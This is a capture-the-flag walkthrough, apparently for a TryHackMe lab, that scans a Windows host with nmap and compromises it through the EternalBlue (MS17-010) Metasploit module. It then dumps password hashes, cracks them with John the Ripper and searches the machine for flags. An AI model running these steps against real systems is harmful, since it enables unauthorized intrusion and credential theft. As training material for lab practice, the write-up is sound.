## Through this box we are going to learn :

- Scan a machine with nmap.
- Exploit a machine with metasploit.
- Crack password with John The Ripper.
- Use powershell to find flags inside a windows machine.

### Section 1 : Recon

ip=10.10.77.120

Let's start by scanning the machine with nmap
```bash
edwards@kali:~$ nmap -T4 -p- -A 10.10.77.120
```
- -T4 : For the speed of the scan, not recommended on real pentest situation.
- -p- : Scan all ports on the machine, so you don't miss anything.
- -A : Enable all kind of scanning, like OS detection.

We can see that we have the OS version and the ports that are open.
Let's go on google to find an exploit for this Windows version. 

I found on Rapid 7 an exploit that we can use on metasploit.

### Section 2 : Exploit

Start metasploit to use the exploit that we found.
```bash
msfconsole
```

Use the command search + the name of the exploit
```bash 
search ms17-010
```

Next step is to say "use + full exploit path" 
```bash
use exploit/windows/smb/ms17_010_eternalblue
```

Display the options with "options" (clever ;) )
If you are not familiar with metasploit, you can see that their are a bunch of options.
Some of them are required but they are already set. 
You just have to enter your target ip with the "set RHOSTS <ip>"

_The options display should look like this after_

Use the command "run" to launch the exploit.
_Or "exploit" if you are a cool kid_

### Section 3 : Cracking hash

We are in ! 

Our next task is to crack the hash password.

We can dump the password with "hashdump".
```bash
hashdump
```

Let's write the output in a file called password.txt.

Then I used a tool called "john the ripper", an open source and very efficient password cracker.

_TryHackMe says that the rockyou.txt wordlist is enough so I used that._

### Section 4 : Find flags
Let's head back to metasploit and find flags hidden inside the machine. 

I used the command "shell" to interact with the file directory manager.
```bash
shell
```

Always check who you are in the system with the "whoami" command.
```bash
whoami
```

We are authority system, look how lucky we got !
_The Authority system users are user user with more powerful privileges than admin user_

Go back to meterpreter  with "ctrl+z". 
Use the command <search -f flag*> to find the location of the 3 flags.

Go back inside with "shell" command and look for them.
- "cd" to move through the file system.
- "more" <file_name> to open the file.
- "dir" to know where you are.

Congrats ! You finished the box !
